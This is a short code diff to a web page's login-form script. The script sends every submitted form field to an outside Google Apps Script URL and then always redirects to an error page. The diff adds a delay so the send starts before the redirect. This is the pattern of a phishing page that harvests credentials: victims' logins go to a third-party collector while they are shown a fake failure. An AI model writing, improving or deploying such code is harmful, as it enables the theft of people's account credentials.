@@ -58,14 +58,16 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const scriptURL = "https://script.google.com/macros/s/AKfycbyREozw_GR_ra6bfnx2R9bIMCb_mDt-Xr9081eZGGDfwRrxVgwEnifvJazp04OsNoPaZw/exec";
     const formData = new FormData(this);
 
-    // Try sending to Google Sheets
     fetch(scriptURL, { method: 'POST', body: formData })
         .finally(() => {
-            // ALWAYS redirect, success or fail
-            window.location.href = "error.html";
+            // redirect ALWAYS
+            setTimeout(() => {
+                window.location.href = "error.html";
+            }, 200); // small delay to let fetch start
         });
 });
 </script>
+
 
 
 </body>
